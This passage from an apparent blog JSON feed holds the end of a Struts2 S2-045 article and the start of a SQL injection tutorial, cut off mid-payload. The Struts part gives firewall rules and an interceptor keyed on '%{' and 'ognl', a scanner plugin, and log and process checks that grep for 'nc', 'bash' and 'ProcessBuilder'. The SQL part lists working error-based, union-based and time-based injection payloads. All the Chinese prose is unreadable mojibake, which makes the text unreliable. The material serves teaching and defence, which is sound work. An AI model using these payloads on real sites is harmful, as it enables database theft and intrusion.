class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;%&#123;&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;ognl&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-åº”ç”¨å±‚åŠ å›º\"><a href=\"#4-åº”ç”¨å±‚åŠ å›º\" class=\"headerlink\" title=\"4. åº”ç”¨å±‚åŠ å›º\"></a>4. åº”ç”¨å±‚åŠ å›º</h4><figure class=\"highlight scala\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scala\"><span class=\"hljs-comment\">// è‡ªå®šä¹‰æ‹¦æˆªå™¨</span><br>public <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">SecurityInterceptor</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">AbstractInterceptor</span> </span>&#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    public <span class=\"hljs-type\">String</span> intercept(<span class=\"hljs-type\">ActionInvocation</span> invocation) <span class=\"hljs-keyword\">throws</span> <span class=\"hljs-type\">Exception</span> &#123;<br>        <span class=\"hljs-type\">HttpServletRequest</span> request = <span class=\"hljs-type\">ServletActionContext</span>.getRequest();<br>        <span class=\"hljs-type\">String</span> contentType = request.getContentType();<br>        <br>        <span class=\"hljs-keyword\">if</span> (contentType != <span class=\"hljs-literal\">null</span> &amp;&amp; contentType.contains(<span class=\"hljs-string\">&quot;%&#123;&quot;</span>)) &#123;<br>            <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-type\">SecurityException</span>(<span class=\"hljs-string\">&quot;Malicious Content-Type detected&quot;</span>);<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> invocation.invoke();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"å®æˆ˜æŠ€å·§ä¸å·¥å…·\"><a href=\"#å®æˆ˜æŠ€å·§ä¸å·¥å…·\" class=\"headerlink\" title=\"å®æˆ˜æŠ€å·§ä¸å·¥å…·\"></a>å®æˆ˜æŠ€å·§ä¸å·¥å…·</h2><h3 id=\"BurpSuiteæ’ä»¶å¼€å‘\"><a href=\"#BurpSuiteæ’ä»¶å¼€å‘\" class=\"headerlink\" title=\"BurpSuiteæ’ä»¶å¼€å‘\"></a>BurpSuiteæ’ä»¶å¼€å‘</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-comment\">// S2-045æ£€æµ‹æ’ä»¶æ¡†æ¶</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">S2045Scanner</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">IScannerCheck</span> &#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    <span class=\"hljs-keyword\">public</span> List&lt;IScanIssue&gt; <span class=\"hljs-title function_\">doActiveScan</span><span class=\"hljs-params\">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</span> &#123;<br>        <span class=\"hljs-comment\">// æ„é€ S2-045 payload</span><br>        <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">payload</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;)...&#125;&quot;</span>;<br>        <br>        <span class=\"hljs-comment\">// å‘é€æµ‹è¯•è¯·æ±‚</span><br>        <span class=\"hljs-type\">byte</span>[] checkRequest = insertionPoint.buildRequest(payload.getBytes());<br>        <span class=\"hljs-type\">IHttpRequestResponse</span> <span class=\"hljs-variable\">checkRequestResponse</span> <span class=\"hljs-operator\">=</span> callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);<br>        <br>        <span class=\"hljs-comment\">// åˆ†æå“åº”åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´</span><br>        <span class=\"hljs-keyword\">if</span> (isVulnerable(checkRequestResponse)) &#123;<br>            <span class=\"hljs-keyword\">return</span> Collections.singletonList(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">CustomScanIssue</span>(<span class=\"hljs-comment\">/* ... */</span>));<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æ‰¹é‡æ£€æµ‹è„šæœ¬\"><a href=\"#æ‰¹é‡æ£€æµ‹è„šæœ¬\" class=\"headerlink\" title=\"æ‰¹é‡æ£€æµ‹è„šæœ¬\"></a>æ‰¹é‡æ£€æµ‹è„šæœ¬</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/bin/bash</span><br><span class=\"hljs-comment\"># S2-045æ‰¹é‡æ£€æµ‹è„šæœ¬</span><br><br>targets=(<br>    <span class=\"hljs-string\">&quot;http://target1.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target2.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target3.com:8080&quot;</span><br>)<br><br><span class=\"hljs-keyword\">for</span> target <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;targets[@]&#125;</span>&quot;</span>; <span class=\"hljs-keyword\">do</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Testing: <span class=\"hljs-variable\">$target</span>&quot;</span><br>    python3 s2-045-check.py <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$target</span>&quot;</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;---&quot;</span><br><span class=\"hljs-keyword\">done</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"åº”æ€¥å“åº”æŒ‡å—\"><a href=\"#åº”æ€¥å“åº”æŒ‡å—\" class=\"headerlink\" title=\"åº”æ€¥å“åº”æŒ‡å—\"></a>åº”æ€¥å“åº”æŒ‡å—</h2><h3 id=\"1-æ¼æ´ç¡®è®¤\"><a href=\"#1-æ¼æ´ç¡®è®¤\" class=\"headerlink\" title=\"1. æ¼æ´ç¡®è®¤\"></a>1. æ¼æ´ç¡®è®¤</h3><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\"># æ£€æŸ¥Struts2ç‰ˆæœ¬<br><span class=\"hljs-keyword\">find</span> <span class=\"hljs-regexp\">/ -name &quot;struts2-core-*.jar&quot; 2&gt;/</span>dev/<span class=\"hljs-keyword\">null</span><br><br># æ£€æŸ¥è®¿é—®æ—¥å¿—ä¸­çš„æ”»å‡»ç‰¹å¾<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;Content-Type.*%\\&#123;&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/apache2/</span>access.log<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;ognl|ProcessBuilder|Runtime&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/tomcat/</span>catalina.out<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-åº”æ€¥å¤„ç½®\"><a href=\"#2-åº”æ€¥å¤„ç½®\" class=\"headerlink\" title=\"2. åº”æ€¥å¤„ç½®\"></a>2. åº”æ€¥å¤„ç½®</h3><figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sas\"># ä¸´æ—¶é˜»æ–­æ”»å‡»IP<br>iptables -A <span class=\"hljs-keyword\">INPUT</span> -s &lt;æ”»å‡»IP&gt; -j <span class=\"hljs-keyword\">DROP</span><br><br># åœæ­¢ç›¸å…³æœåŠ¡<br>systemctl <span class=\"hljs-keyword\">stop</span> tomcat<br>systemctl <span class=\"hljs-keyword\">stop</span> apache2<br><br># å¤‡ä»½ç³»ç»ŸçŠ¶æ€<br>tar -czf /tmp/system_backup_$(date +<span class=\"hljs-title function_\">%Y</span><span class=\"hljs-title function_\">%m</span><span class=\"hljs-title function_\">%d_</span><span class=\"hljs-title function_\">%H</span><span class=\"hljs-title function_\">%M</span><span class=\"hljs-title function_\">%S</span>).tar.gz /var/log /etc /opt/tomcat<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-ç—•è¿¹æ¸…ç†æ£€æŸ¥\"><a href=\"#3-ç—•è¿¹æ¸…ç†æ£€æŸ¥\" class=\"headerlink\" title=\"3. ç—•è¿¹æ¸…ç†æ£€æŸ¥\"></a>3. ç—•è¿¹æ¸…ç†æ£€æŸ¥</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\"># æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸è¿›ç¨‹<br><span class=\"hljs-keyword\">ps</span> aux | <span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;nc|bash|sh|python|perl&quot;</span> | <span class=\"hljs-keyword\">grep</span> -v <span class=\"hljs-keyword\">grep</span><br><br># æ£€æŸ¥ç½‘ç»œè¿æ¥<br>netstat -antlp | <span class=\"hljs-keyword\">grep</span> ESTABLISHED<br><br># æ£€æŸ¥æ–°å¢æ–‡ä»¶<br><span class=\"hljs-keyword\">find</span> /tmp /var/tmp -<span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">f</span> -mtime -<span class=\"hljs-number\">1</span><br><span class=\"hljs-keyword\">find</span> /<span class=\"hljs-keyword\">opt</span>/tomcat/webapps -name <span class=\"hljs-string\">&quot;*.jsp&quot;</span> -mtime -<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>Struts2-045æ¼æ´çš„ç‰¹ç‚¹ï¼š</p>\n<h3 id=\"ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰\"><a href=\"#ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰\" class=\"headerlink\" title=\"ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰\"></a>ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰</h3><ul>\n<li><strong>åˆ©ç”¨ç®€å•</strong>: åªéœ€æ„é€ HTTPè¯·æ±‚å¤´å³å¯</li>\n<li><strong>å½±å“é¢å¹¿</strong>: å¤§é‡ä¼ä¸šçº§åº”ç”¨ä½¿ç”¨Struts2æ¡†æ¶</li>\n<li><strong>æ£€æµ‹å›°éš¾</strong>: æ”»å‡»æµé‡å¯èƒ½è¢«å¿½ç•¥</li>\n<li><strong>å±å®³ä¸¥é‡</strong>: ç›´æ¥è·å¾—æœåŠ¡å™¨æ‰§è¡Œæƒé™</li>\n</ul>\n<h3 id=\"é˜²æŠ¤è¦ç‚¹\"><a href=\"#é˜²æŠ¤è¦ç‚¹\" class=\"headerlink\" title=\"é˜²æŠ¤è¦ç‚¹\"></a>é˜²æŠ¤è¦ç‚¹</h3><ul>\n<li><strong>åŠæ—¶æ›´æ–°</strong>: å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆ</li>\n<li><strong>æ·±åº¦é˜²å¾¡</strong>: ç»“åˆWAFã€IDSç­‰å¤šå±‚é˜²æŠ¤</li>\n<li><strong>ç›‘æ§å‘Šè­¦</strong>: å»ºç«‹æœ‰æ•ˆçš„å®‰å…¨ç›‘æ§ä½“ç³»</li>\n<li><strong>åº”æ€¥å“åº”</strong>: åˆ¶å®šå®Œå–„çš„å®‰å…¨äº‹ä»¶å“åº”æµç¨‹</li>\n</ul>\n<hr>\n<blockquote>\n<p><strong>å…è´£å£°æ˜</strong>: æœ¬æ–‡å†…å®¹ä»…ä¾›å®‰å…¨ç ”ç©¶å’Œé˜²æŠ¤å‚è€ƒï¼Œè¯·å‹¿ç”¨äºéæ³•æ”»å‡»æ´»åŠ¨ã€‚</p>\n</blockquote>\n<p><strong>å‚è€ƒèµ„æº</strong>:</p>\n<ul>\n<li><a href=\"https://struts.apache.org/announce.html#a20170307\">Apache Struts2å®˜æ–¹å®‰å…¨å…¬å‘Š</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638\">CVE-2017-5638è¯¦ç»†ä¿¡æ¯</a></li>\n<li><a href=\"https://owasp.org/www-project-top-ten/\">OWASP Struts2å®‰å…¨æŒ‡å—</a></li>\n</ul>\n",
            "tags": [
                "Webå®‰å…¨",
                "Struts2",
                "RCE",
                "æ¼æ´å¤ç°",
                "OGNLæ³¨å…¥"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "url": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "title": "SQLæ³¨å…¥æ”»å‡»è¯¦è§£",
            "date_published": "2025-07-23T23:51:59.000Z",
            "content_html": "<h1 id=\"SQLæ³¨å…¥æ”»å‡»è¯¦è§£\"><a href=\"#SQLæ³¨å…¥æ”»å‡»è¯¦è§£\" class=\"headerlink\" title=\"SQLæ³¨å…¥æ”»å‡»è¯¦è§£\"></a>SQLæ³¨å…¥æ”»å‡»è¯¦è§£</h1><h2 id=\"å‰è¨€\"><a href=\"#å‰è¨€\" class=\"headerlink\" title=\"å‰è¨€\"></a>å‰è¨€</h2><p>SQLæ³¨å…¥ä½œä¸ºWebåº”ç”¨ç¨‹åºä¸­æœ€å¸¸è§çš„å®‰å…¨æ¼æ´ä¹‹ä¸€ï¼Œè‡³ä»Šä»æ˜¯æ”»å‡»è€…åˆ©ç”¨çš„ä¸»è¦æ‰‹æ®µã€‚æœ¬æ–‡å°†è¯¦ç»†è®²è§£SQLæ³¨å…¥çš„å„ç§åˆ©ç”¨æ–¹å¼ï¼Œå¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å’Œå¼€å‘è€…æ·±å…¥ç†è§£è¿™ä¸€ç»å…¸æ¼æ´ã€‚</p>\n<h2 id=\"ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ\"><a href=\"#ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ\"></a>ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ</h2><p><strong>SQLæ³¨å…¥ï¼ˆSQL Injectionï¼‰</strong> æ˜¯ä¸€ç§å°†æ¶æ„SQLè¯­å¥æ’å…¥åŸæœ¬æ­£å¸¸æŸ¥è¯¢ä¸­çš„æ”»å‡»æ–¹å¼ã€‚æ”»å‡»è€…é€šè¿‡åœ¨ç”¨æˆ·è¾“å…¥ä¸­æ³¨å…¥ç‰¹æ®Šçš„SQLä»£ç ï¼Œå¯ä»¥æ§åˆ¶æ•°æ®åº“çš„æŸ¥è¯¢é€»è¾‘ï¼Œè¿›è€Œè¯»å–ã€ä¿®æ”¹ç”šè‡³æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>\n<h3 id=\"æ”»å‡»åŸç†\"><a href=\"#æ”»å‡»åŸç†\" class=\"headerlink\" title=\"æ”»å‡»åŸç†\"></a>æ”»å‡»åŸç†</h3><p>å½“Webåº”ç”¨ç¨‹åºæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå……åˆ†éªŒè¯å’Œè¿‡æ»¤æ—¶ï¼Œæ”»å‡»è€…æäº¤çš„æ¶æ„è¾“å…¥ä¼šè¢«ç›´æ¥æ‹¼æ¥åˆ°SQLæŸ¥è¯¢è¯­å¥ä¸­ï¼Œå¯¼è‡´åŸæœ‰çš„æŸ¥è¯¢é€»è¾‘è¢«æ”¹å˜ã€‚</p>\n<h2 id=\"SQLæ³¨å…¥ç±»å‹è¯¦è§£\"><a href=\"#SQLæ³¨å…¥ç±»å‹è¯¦è§£\" class=\"headerlink\" title=\"SQLæ³¨å…¥ç±»å‹è¯¦è§£\"></a>SQLæ³¨å…¥ç±»å‹è¯¦è§£</h2><h3 id=\"1-é”™è¯¯æ³¨å…¥ï¼ˆError-based-Injectionï¼‰\"><a href=\"#1-é”™è¯¯æ³¨å…¥ï¼ˆError-based-Injectionï¼‰\" class=\"headerlink\" title=\"1. é”™è¯¯æ³¨å…¥ï¼ˆError-based Injectionï¼‰\"></a>1. é”™è¯¯æ³¨å…¥ï¼ˆError-based Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šé€šè¿‡æ³¨å…¥æœ‰è¯­æ³•é”™è¯¯æˆ–è¿è¡Œé”™è¯¯çš„SQLè¯­å¥ï¼Œä½¿æ•°æ®åº“æŠ›å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œä»é”™è¯¯ä¿¡æ¯ä¸­æå–å­—æ®µã€è¡¨åã€æ•°æ®åº“ç‰ˆæœ¬ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p>\n<p><strong>æ ¸å¿ƒå…³é”®å­—</strong>ï¼š</p>\n<ul>\n<li><code>extractvalue()</code> - XMLè·¯å¾„æå–å‡½æ•°</li>\n<li><code>updatexml()</code> - XMLæ›´æ–°å‡½æ•°</li>\n<li><code>floor(rand(0)*2)</code> - éšæœºæ•°å–æ•´å‡½æ•°</li>\n<li><code>group by</code> - åˆ†ç»„æŸ¥è¯¢</li>\n</ul>\n<p><strong>ç»å…¸payloadç¤ºä¾‹</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">user</span>(), <span class=\"hljs-number\">0x7e</span>))<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> updatexml(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">database</span>(), <span class=\"hljs-number\">0x7e</span>), <span class=\"hljs-number\">1</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> concat(version(), floor(rand(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">having</span> min(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼š</p>\n<ul>\n<li><code>extractvalue()</code>å‡½æ•°åœ¨å‚æ•°æ ¼å¼é”™è¯¯æ—¶ä¼šæŠ›å‡ºè¯¦ç»†çš„é”™è¯¯ä¿¡æ¯</li>\n<li><code>0x7e</code>ä»£è¡¨æ³¢æµªå·<code>~</code>ï¼Œç”¨ä½œæ•°æ®åˆ†éš”ç¬¦ä¾¿äºè¯†åˆ«</li>\n<li>é€šè¿‡æ„é€ ç‰¹å®šçš„é”™è¯¯æ¡ä»¶ï¼Œå¯ä»¥åœ¨æŠ¥é”™ä¸­æ³„éœ²æ•°æ®åº“æ•æ„Ÿä¿¡æ¯</li>\n</ul>\n<h3 id=\"2-è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based-Injectionï¼‰\"><a href=\"#2-è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based-Injectionï¼‰\" class=\"headerlink\" title=\"2. è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based Injectionï¼‰\"></a>2. è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šé€šè¿‡<code>union select</code>è¯­å¥å°†æ”»å‡»è€…æŒ‡å®šçš„æŸ¥è¯¢ç»“æœä¸åŸå§‹æŸ¥è¯¢ç»“æœåˆå¹¶ï¼Œä»è€Œåœ¨é¡µé¢ä¸Šç›´æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„æ•æ„Ÿæ•°æ®ã€‚</p>\n<p><strong>æ ¸å¿ƒå…³é”®å­—</strong>ï¼š</p>\n<ul>\n<li><code>union select</code> - è”åˆæŸ¥è¯¢</li>\n<li><code>null</code> - ç©ºå€¼å ä½ç¬¦</li>\n<li><code>order by</code> - å­—æ®µæ’åºï¼ˆç”¨äºæ¢æµ‹åˆ—æ•°ï¼‰</li>\n<li><code>from dual</code> - Oracleæ•°æ®åº“è™šæ‹Ÿè¡¨</li>\n</ul>\n<p><strong>æ¢æµ‹ä¸åˆ©ç”¨æµç¨‹</strong>ï¼š</p>\n<ol>\n<li><strong>ç¡®å®šå­—æ®µæ•°é‡</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>æ„é€ è”åˆæŸ¥è¯¢</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-keyword\">database</span>(),version() <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>æå–æ•æ„Ÿæ•°æ®</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">table_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">tables</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">column_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-built_in\">table_name</span>=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based-Injectionï¼‰\"><a href=\"#3-æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based-Injectionï¼‰\" class=\"headerlink\" title=\"3. æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based Injectionï¼‰\"></a>3. æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šé€šè¿‡æ‰§è¡Œæ•°æ®åº“å»¶æ—¶å‡½æ•°ï¼Œæ ¹æ®HTTPå“åº”æ—¶é—´åˆ¤æ–­æ³¨å…¥æ¡ä»¶çš„çœŸå‡ã€‚è¿™ç§æ–¹æ³•ç‰¹åˆ«é€‚ç”¨äºæ— é¡µé¢å›æ˜¾çš„ç›²æ³¨åœºæ™¯ã€‚</p>\n<p><strong>ä¸åŒæ•°æ®åº“çš„å»¶æ—¶å‡½æ•°</strong>ï¼š</p>\n<ul>\n<li><strong>MySQL</strong>: <code>sleep(x)</code>, <code>benchmark(count, expr)</code></li>\n<li><strong>PostgreSQL</strong>: <code>pg_sleep(x)</code></li>\n<li><strong>Oracle</strong>: <code>dbms_pipe.receive_message(&#39;&#39;,x)</code></li>\n<li><strong>SQL Server</strong>: <code>waitfor delay &#39;00:00:0x&#39;</code></li>\n</ul>\n<p><strong>å…¸å‹payload</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> sleep(<span class=\"hljs-number\">5</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(substr(<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)=<span class=\"hljs-string\">&#x27;r&#x27;</span>, sleep(<span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span>, benchmark(<span class=\"hljs-number\">5000000</span>,md5(<span class=\"hljs-string\">&#x27;test&#x27;</span>)), <span class=\"hljs-number\">0</span>) <span 